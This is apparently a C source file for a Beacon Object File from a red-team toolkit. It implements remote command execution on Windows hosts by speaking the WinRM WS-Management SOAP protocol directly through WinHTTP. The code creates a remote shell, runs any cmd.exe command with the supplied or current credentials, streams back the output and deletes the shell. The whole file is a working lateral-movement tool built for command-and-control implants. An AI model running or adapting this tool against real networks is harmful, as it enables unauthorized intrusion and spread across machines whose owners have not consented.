/*
 * bof-winrm-exec <host> <command> [user] [password]
 *
 * Native WinRM execution over WS-Management.  Instead of shelling out to
 * winrs.exe this speaks the WS-Man SOAP protocol directly with WinHTTP:
 *
 *   Create shell  ->  Command  ->  Receive (stdout/stderr)  ->  Delete shell
 *
 * `host` accepts a plain name, host:port, or an http(s):// prefix.  Port 5985
 * (HTTP) is the default; https/5986 selects TLS.  Explicit user/password are
 * optional; otherwise the current logon is used (Negotiate/NTLM).
 *
 * Requires a WinRM listener on the target and the WinRM service running.  The
 * BOF does not use Basic auth unless credentials are supplied explicitly.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

#define WSMAN_BODY_MAX  (192 * 1024)
#define WSMAN_RESP_MAX  (512 * 1024)
#define WSMAN_NS_CMD    "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd"

static HINTERNET g_sess = NULL;
static HINTERNET g_conn = NULL;
static char g_endpoint[640];
static char g_msgbuf[96];
static unsigned int g_msgseq = 0;
static wchar_t g_wuser[256], g_wpass[256];
static int g_have_creds = 0;

static void next_msgid(char *out, int outsz)
{
    unsigned long long t = KERNEL32$GetTickCount64();
    unsigned int lo = (unsigned int)(t & 0xffffffffu);
    unsigned int hi = (unsigned int)(t >> 32);
    unsigned int seq = ++g_msgseq;

    /* Informal but unique-enough uuid:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx. */
    bof_snprintf(out, outsz, "uuid:%08x-%04x-%04x-%04x-%08x%04x",
                 lo, (hi ^ seq) & 0xffff, (lo >> 16) & 0xffff,
                 (seq * 2654435761u) & 0xffff,
                 hi, (lo ^ (seq << 12)) & 0xffff);
}

/* XML-escape text into out. */
static void xml_escape(const char *in, char *out, int outsz)
{
    int o = 0;
    while (in && *in && o < outsz - 8) {
        switch (*in) {
        case '&':  bof_strncat(out, "&amp;", outsz - o - 1); o += 5; break;
        case '<':  bof_strncat(out, "&lt;", outsz - o - 1); o += 4; break;
        case '>':  bof_strncat(out, "&gt;", outsz - o - 1); o += 4; break;
        case '"':  bof_strncat(out, "&quot;", outsz - o - 1); o += 6; break;
        case '\'': bof_strncat(out, "&apos;", outsz - o - 1); o += 6; break;
        default:   out[o++] = *in; out[o] = 0; break;
        }
        in++;
    }
    out[o] = 0;
}

/* Find the textual value of the first <tag ...>value</...tag> (prefix
 * tolerated: pass "ShellId" and it matches rsp:ShellId / w:ShellId). */
static int xml_value(const char *xml, const char *tag, char *out, int outsz)
{
    const char *p = xml;
    int taglen = bof_strlen(tag);

    out[0] = 0;
    while ((p = bof_strstr(p, tag)) != NULL) {
        const char *lt = p;
        const char *gt;
        const char *end;

        while (lt > xml && lt[-1] != '<' && (p - lt) < 24) lt--;
        if (lt == xml || lt[-1] != '<') { p += taglen; continue; }
        if (lt[1] == '/') { p += taglen; continue; }
        gt = p + taglen;
        while (*gt && *gt != '>') gt++;
        if (!*gt) break;
        if (gt[-1] == '/') { p = gt + 1; continue; }
        gt++;
        end = bof_strstr(gt, "</");
        if (!end) { p = gt; continue; }
        if (end - gt < outsz) {
            bof_memcpy(out, gt, (unsigned int)(end - gt));
            out[end - gt] = 0;
            return 0;
        }
        p = gt;
    }
    return -1;
}

static int xml_has(const char *xml, const char *needle)
{
    return bof_strstr(xml, needle) != NULL;
}

/* Return the value of attr="..." inside the element starting at p. */
static int xml_attr(const char *p, const char *attr, char *out, int outsz)
{
    char pat[96];
    const char *q;
    int o = 0;

    out[0] = 0;
    bof_strncpy(pat, attr, sizeof(pat));
    bof_strncat(pat, "=\"", sizeof(pat) - bof_strlen(pat) - 1);
    q = bof_strstr(p, pat);
    if (!q) return -1;
    q += bof_strlen(pat);
    while (*q && *q != '"' && o < outsz - 1) out[o++] = *q++;
    out[o] = 0;
    return o > 0 ? 0 : -1;
}

static int wsman_open(const char *host, int port, int secure)
{
    wchar_t whost[256];

    if (bof_a2w(host, whost, 256) <= 0) {
        bof_error_text("wsman_open", "host name is empty or too long");
        bof_error_context("host", host);
        return -1;
    }
    bof_snprintf(g_endpoint, sizeof(g_endpoint), "%s://%s:%d/wsman",
                 secure ? "https" : "http", host, port);

    g_sess = WINHTTP$WinHttpOpen(L"AdaptixBOFKit/1.0",
                                 WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                 WINHTTP_NO_PROXY_NAME,
                                 WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_sess) {
        bof_error_win32("WinHttpOpen", KERNEL32$GetLastError(),
                        "cannot initialize WinHTTP");
        return -1;
    }
    g_conn = WINHTTP$WinHttpConnect(g_sess, whost, (INTERNET_PORT)port, 0);
    if (!g_conn) {
        bof_error_win32("WinHttpConnect", KERNEL32$GetLastError(),
                        "cannot connect to the WinRM endpoint");
        bof_error_context("endpoint", g_endpoint);
        WINHTTP$WinHttpCloseHandle(g_sess);
        g_sess = NULL;
        return -1;
    }
    return 0;
}

static void wsman_close(void)
{
    if (g_conn) WINHTTP$WinHttpCloseHandle(g_conn);
    if (g_sess) WINHTTP$WinHttpCloseHandle(g_sess);
    g_conn = NULL;
    g_sess = NULL;
}

/* POST one SOAP envelope and collect the whole response. */
static int wsman_post(const char *body, char *resp, int respcap, int *status)
{
    HINTERNET req = NULL;
    DWORD flags = 0, got = 0, total = 0, avail = 0;
    BOOL ok;
    int rc = -1;

    resp[0] = 0;
    if (status) *status = 0;
    if (!g_conn) {
        bof_error_text("wsman_post", "no WinHTTP connection");
        return -1;
    }

    req = WINHTTP$WinHttpOpenRequest(g_conn, L"POST", L"/wsman", NULL,
                                     WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!req) {
        bof_error_win32("WinHttpOpenRequest(POST /wsman)",
                        KERNEL32$GetLastError(),
                        "cannot create the WS-Man request");
        bof_error_context("endpoint", g_endpoint);
        return -1;
    }

    if (g_have_creds) {
        WINHTTP$WinHttpSetCredentials(req, WINHTTP_AUTH_TARGET_SERVER,
            WINHTTP_AUTH_SCHEME_NEGOTIATE | WINHTTP_AUTH_SCHEME_NTLM |
            WINHTTP_AUTH_SCHEME_BASIC,
            g_wuser, g_wpass, NULL);
    }

    ok = WINHTTP$WinHttpSendRequest(req,
            L"Content-Type: application/soap+xml;charset=UTF-8\r\n"
            L"Connection: Keep-Alive",
            (DWORD)-1L, (LPVOID)body, (DWORD)bof_strlen(body),
            (DWORD)bof_strlen(body), 0);
    if (!ok) {
        bof_error_win32("WinHttpSendRequest", KERNEL32$GetLastError(),
                        "cannot send the WS-Man request");
        bof_error_context("endpoint", g_endpoint);
        goto done;
    }
    if (!WINHTTP$WinHttpReceiveResponse(req, NULL)) {
        bof_error_win32("WinHttpReceiveResponse", KERNEL32$GetLastError(),
                        "no response from the WinRM endpoint (listener/firewall?)");
        bof_error_context("endpoint", g_endpoint);
        goto done;
    }

    if (status) {
        DWORD sc = 0, sclen = sizeof(sc);
        WINHTTP$WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE,
                                    WINHTTP_HEADER_NAME_BY_INDEX, &sc,
                                    &sclen, WINHTTP_NO_HEADER_INDEX);
        *status = (int)sc;
    }

    for (;;) {
        avail = 0;
        if (!WINHTTP$WinHttpQueryDataAvailable(req, &avail)) {
            bof_error_win32("WinHttpQueryDataAvailable", KERNEL32$GetLastError(),
                            "failed while waiting for the WS-Man response");
            break;
        }
        if (!avail) break;
        if ((int)(total + avail) >= respcap - 1) break;
        if (!WINHTTP$WinHttpReadData(req, resp + total, avail, &got)) {
            bof_error_win32("WinHttpReadData", KERNEL32$GetLastError(),
                            "failed while reading the WS-Man response");
            break;
        }
        if (!got) break;
        total += got;
    }
    resp[total] = 0;
    rc = (int)total;

done:
    if (req) WINHTTP$WinHttpCloseHandle(req);
    return rc;
}

/* Build the common header.  action/extra are raw XML fragments. */
static void wsman_header(char *out, int outsz, const char *action,
                         const char *extra)
{
    bof_snprintf(out, outsz,
        "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" "
        "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" "
        "xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" "
        "xmlns:p=\"http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd\">"
        "<s:Header>"
        "<a:Action s:mustUnderstand=\"true\">%s</a:Action>"
        "<a:To s:mustUnderstand=\"true\">%s</a:To>"
        "<a:ReplyTo><a:Address>http://schemas.xmlsoap.org/ws/2004/08/"
        "addressing/role/anonymous</a:Address></a:ReplyTo>"
        "<w:ResourceURI s:mustUnderstand=\"true\">" WSMAN_NS_CMD
        "</w:ResourceURI>"
        "<a:MessageID>%s</a:MessageID>"
        "<w:MaxEnvelopeSize s:mustUnderstand=\"true\">153600"
        "</w:MaxEnvelopeSize>"
        "<w:Locale xml:lang=\"en-US\" s:mustUnderstand=\"false\"/>"
        "<p:DataLocale xml:lang=\"en-US\" s:mustUnderstand=\"false\"/>"
        "%s",
        action, g_endpoint, g_msgbuf, extra ? extra : "");
}

static void wsman_selector(char *out, int outsz, const char *shell)
{
    bof_snprintf(out, outsz,
        "<w:SelectorSet><w:Selector Name=\"ShellId\">%s</w:Selector>"
        "</w:SelectorSet>", shell);
}

/* Extract every <rsp:Stream ...>base64</rsp:Stream> and print it. */
static void print_streams(const char *resp)
{
    const char *p = resp;

    while ((p = bof_strstr(p, "Stream")) != NULL) {
        const char *lt = p, *gt, *end;
        char name[32] = "";
        char b64[65536];
        unsigned char *raw;
        int rawlen, n = 0;

        while (lt > resp && lt[-1] != '<' && (p - lt) < 16) lt--;
        if (lt == resp || lt[-1] != '<' || lt[1] == '/') { p += 6; continue; }
        gt = bof_strstr(p, ">");
        if (!gt) break;
        end = bof_strstr(gt, "</");
        if (!end) { p = gt + 1; continue; }

        xml_attr(lt, "Name", name, sizeof(name));
        if (end - gt - 1 > (int)sizeof(b64) - 1) { p = end + 2; continue; }
        bof_memcpy(b64, gt + 1, (unsigned int)(end - gt - 1));
        b64[end - gt - 1] = 0;

        raw = (unsigned char *)KERNEL32$VirtualAlloc(NULL, sizeof(b64),
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (raw) {
            rawlen = bof_b64_decode(b64, raw, sizeof(b64));
            if (rawlen > 0) {
                if (n < 4095) {
                    char text[4096];
                    if (rawlen > 4095) rawlen = 4095;
                    bof_memcpy(text, raw, (unsigned int)rawlen);
                    text[rawlen] = 0;
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", text);
                    n += rawlen;
                }
            }
            KERNEL32$VirtualFree(raw, 0, MEM_RELEASE);
        }
        p = end + 2;
    }
}

void go(char *args, int alen)
{
    datap parser;
    char *hostarg, *command, *user = "", *pass = "";
    int hlen, clen, ulen, plen;
    char host[256], escaped[8192], extra[2048], body[16000];
    int port = 5985, secure = 0, status = 0, rc, i;
    char *resp = NULL;
    int shell_ok = 0, cmd_ok = 0;
    char shell[128] = "", cmdid[128] = "";
    int exitcode = -1;

    BeaconDataParse(&parser, args, alen);
    hostarg = BeaconDataExtract(&parser, &hlen);
    command = BeaconDataExtract(&parser, &clen);
    user    = BeaconDataExtract(&parser, &ulen);
    pass    = BeaconDataExtract(&parser, &plen);
    if (!hostarg || !hostarg[0] || !command || !command[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: winrm-exec <host> [command] [user] [password]\n");
        return;
    }
    if (!user) user = "";
    if (!pass) pass = "";

    bof_strncpy(host, hostarg, sizeof(host));
    if (bof_strncmp(host, "https://", 8) == 0) {
        secure = 1; port = 5986;
        bof_memmove(host, host + 8, bof_strlen(host + 8) + 1);
    } else if (bof_strncmp(host, "http://", 7) == 0) {
        bof_memmove(host, host + 7, bof_strlen(host + 7) + 1);
    }
    {
        char *slash = bof_strchr(host, '/');
        if (slash) *slash = 0;
    }
    {
        char *colon = NULL, *p;
        for (p = host; *p; p++) if (*p == ':') colon = p;
        if (colon) {
            *colon = 0;
            port = bof_atoi(colon + 1);
            if (port <= 0 || port > 65535) port = secure ? 5986 : 5985;
        }
    }
    if (secure && port == 5985) port = 5986;

    if (user[0]) {
        if (bof_a2w(user, g_wuser, 256) <= 0 ||
            bof_a2w(pass, g_wpass, 256) <= 0) {
            bof_error_text("credentials", "user name or password is too long");
            return;
        }
        g_have_creds = 1;
    }

    resp = (char *)KERNEL32$VirtualAlloc(NULL, WSMAN_RESP_MAX,
               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!resp) {
        bof_error_win32("VirtualAlloc(response)", KERNEL32$GetLastError(),
                        "cannot allocate the WS-Man response buffer");
        bof_error_num("size", (unsigned long long)WSMAN_RESP_MAX);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] endpoint: %s://%s:%d/wsman\n",
                 secure ? "https" : "http", host, port);
    if (wsman_open(host, port, secure) != 0) {
        goto done;
    }

    /* 1. Create shell. */
    next_msgid(g_msgbuf, sizeof(g_msgbuf));
    wsman_header(body, sizeof(body),
                 "http://schemas.xmlsoap.org/ws/2004/09/transfer/Create",
                 "<w:OptionSet><w:Option Name=\"WINRS_NOPROFILE\">TRUE"
                 "</w:Option><w:Option Name=\"WINRS_CODEPAGE\">437"
                 "</w:Option></w:OptionSet>");
    bof_strncat(body, "</s:Header><s:Body><p:Shell/></s:Body></s:Envelope>",
                sizeof(body) - bof_strlen(body) - 1);

    rc = wsman_post(body, resp, WSMAN_RESP_MAX, &status);
    if (rc <= 0 || (status != 200 && status != 201)) {
        bof_error_text("create shell", "WinRM rejected the shell creation");
        bof_error_num("http_status", (unsigned long long)status);
        bof_error_num("bytes", (unsigned long long)(rc > 0 ? rc : 0));
        if (rc > 0) BeaconPrintf(CALLBACK_OUTPUT, "%.600s\n", resp);
        goto done;
    }
    if (xml_value(resp, "ShellId", shell, sizeof(shell)) != 0) {
        bof_error_text("create shell", "no ShellId in the response");
        BeaconPrintf(CALLBACK_OUTPUT, "%.600s\n", resp);
        goto done;
    }
    shell_ok = 1;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] shell: %s\n", shell);

    /* 2. Run the command. */
    xml_escape(command, escaped, sizeof(escaped));
    wsman_selector(extra, sizeof(extra), shell);
    bof_strncat(extra,
        "<w:OptionSet><w:Option Name=\"WINRS_CONSOLEMODE_STDIN\">FALSE"
        "</w:Option><w:Option Name=\"WINRS_SKIP_CMD_SHELL\">FALSE"
        "</w:Option></w:OptionSet>",
        sizeof(extra) - bof_strlen(extra) - 1);

    next_msgid(g_msgbuf, sizeof(g_msgbuf));
    wsman_header(body, sizeof(body),
        "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command",
        extra);
    bof_snprintf(extra, sizeof(extra),
        "</s:Header><s:Body>"
        "<rsp:CommandLine xmlns:rsp=\"http://schemas.microsoft.com/wbem/"
        "wsman/1/windows/shell\">"
        "<rsp:Command>cmd.exe</rsp:Command>"
        "<rsp:Arguments>/c %s</rsp:Arguments>"
        "</rsp:CommandLine></s:Body></s:Envelope>", escaped);
    bof_strncat(body, extra, sizeof(body) - bof_strlen(body) - 1);

    rc = wsman_post(body, resp, WSMAN_RESP_MAX, &status);
    if (rc <= 0 || status != 200) {
        bof_error_text("run command", "WinRM rejected the command request");
        bof_error_num("http_status", (unsigned long long)status);
        bof_error_num("bytes", (unsigned long long)(rc > 0 ? rc : 0));
        if (rc > 0) BeaconPrintf(CALLBACK_OUTPUT, "%.600s\n", resp);
        goto done;
    }
    if (xml_value(resp, "CommandId", cmdid, sizeof(cmdid)) != 0) {
        bof_error_text("run command", "no CommandId in the response");
        BeaconPrintf(CALLBACK_OUTPUT, "%.600s\n", resp);
        goto done;
    }
    cmd_ok = 1;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] command id: %s\n", cmdid);

    /* 3. Pull stdout/stderr until the command reaches Done. */
    for (i = 0; i < 600; i++) {          /* ~60 s at 100 ms poll */
        int done = 0;
        wsman_selector(extra, sizeof(extra), shell);
        next_msgid(g_msgbuf, sizeof(g_msgbuf));
        wsman_header(body, sizeof(body),
            "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive",
            extra);
        bof_snprintf(extra, sizeof(extra),
            "</s:Header><s:Body>"
            "<rsp:Receive xmlns:rsp=\"http://schemas.microsoft.com/wbem/"
            "wsman/1/windows/shell\">"
            "<rsp:DesiredStream CommandId=\"%s\">stdout stderr"
            "</rsp:DesiredStream></rsp:Receive></s:Body></s:Envelope>", cmdid);
        bof_strncat(body, extra, sizeof(body) - bof_strlen(body) - 1);

        rc = wsman_post(body, resp, WSMAN_RESP_MAX, &status);
        if (rc <= 0) {
            bof_error_text("receive output", "no response while polling for output");
            bof_error_num("http_status", (unsigned long long)status);
            bof_error_context("command_id", cmdid);
            break;
        }
        print_streams(resp);

        if (xml_has(resp, "State/Done") || xml_has(resp, "State=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell/State/Done\""))
            done = 1;
        if (xml_value(resp, "ExitCode", extra, sizeof(extra)) == 0)
            exitcode = bof_atoi(extra);

        if (done) break;
        if (xml_has(resp, "faultcode") || xml_has(resp, "s:Fault")) {
            bof_error_text("WS-Man fault", "the endpoint returned a SOAP fault");
            BeaconPrintf(CALLBACK_OUTPUT, "%.600s\n", resp);
            break;
        }
        KERNEL32$Sleep(100);
    }

    if (exitcode >= 0)
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] exit code: %d\n", exitcode);
    else
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] command did not report exit code\n");

    /* 4. Delete the shell. */
    wsman_selector(extra, sizeof(extra), shell);
    next_msgid(g_msgbuf, sizeof(g_msgbuf));
    wsman_header(body, sizeof(body),
        "http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete", extra);
    bof_strncat(body, "</s:Header><s:Body/></s:Envelope>",
                sizeof(body) - bof_strlen(body) - 1);
    rc = wsman_post(body, resp, WSMAN_RESP_MAX, &status);
    if (rc >= 0 && (status == 200 || status == 204))
        BeaconPrintf(CALLBACK_OUTPUT, "[*] shell %s deleted\n", shell);
    else {
        bof_error_text("delete shell", "WinRM did not confirm shell cleanup");
        bof_error_num("http_status", (unsigned long long)status);
        bof_error_context("shell_id", shell);
    }

done:
    if (cmd_ok && shell_ok) { /* already cleaned up above when reachable */ }
    wsman_close();
    if (resp) {
        bof_memzero(resp, WSMAN_RESP_MAX);
        KERNEL32$VirtualFree(resp, 0, MEM_RELEASE);
    }
    bof_memzero(g_wpass, sizeof(g_wpass));
}
